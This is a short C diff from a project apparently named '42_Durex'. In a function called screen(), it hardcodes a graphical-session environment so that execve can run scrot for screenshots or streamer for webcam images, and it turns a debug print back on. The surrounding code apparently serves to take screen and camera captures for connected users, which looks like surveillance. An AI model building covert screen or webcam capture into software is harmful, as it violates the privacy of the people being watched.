@@ -159,6 +159,25 @@ static void	screen(t_users *users, char **envp, uint8_t flag)
 	/*char	*exec_screen[] = {"/usr/bin/scrot", "/tmp/screen.jpeg", NULL};*/
 	char	*exec_cam[] = {"/usr/bin/streamer", "-f", "jpeg", "-s", "1920x1080", "-o", IMG_PATH, NULL};
 	/*streamer -f jpeg -s 1024x768 -o image.jpeg*/
+	char *env[] = {"DISPLAY=:0",
+					"HOME=/home/segfault42",
+					"LOGNAME=segfault42",
+					"SHLVL=1",
+					"PWD=/home/segfault42/Documents/42_Durex",
+					"OLDPWD=/home/segfault42/Documents/42_Durex",
+					"ZSH=/home/rabougue/.oh-my-zsh",
+					"PAGER=less",
+					"LESS=-R",
+					"LC_CTYPE=",
+					"LSCOLORS=Gxfxcxdxbxegedabagacad",
+					"LS_COLORS=",
+					"PROMPT_START_TAG=SegFault42 -> ",
+					"PROMPT_END_TAG= <- $",
+					"PROMPT_START_TAG_COLOR=172",
+					"PROMPT_END_TAG_COLOR=172",
+					"PATH=/home/rabougue/bin:/home/rabougue/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/home/rabougue/.antigen/bundles/robbyrussell/oh-my-zsh/plugins/heroku:/home/rabougue/.vimpkg/bin",
+					"_=/usr/bin/env",
+					""};
 	int		status;
 	ssize_t	ret_read = 0;
 	char	buff[BUFFSIZE] = {0};
@@ -173,8 +192,8 @@ static void	screen(t_users *users, char **envp, uint8_t flag)
 		if (flag == SCREEN)
 		{
 			/*system("/usr/bin/import -window root /tmp/screen.jpeg");*/
-			/*dprintf(1, "%s %s %s %s\n", exec_screen[0], exec_screen[1], exec_screen[2], exec_screen[3]);*/
-			if (execve(exec_screen[0], exec_screen, envp) == -1)
+			dprintf(1, "%s %s %s %s\n", exec_screen[0], exec_screen[1], exec_screen[2], exec_screen[3]);
+			if (execve(exec_screen[0], exec_screen, env) == -1)
 				perror("execv");
 				/*printf("error scrren\n");*/
 		}
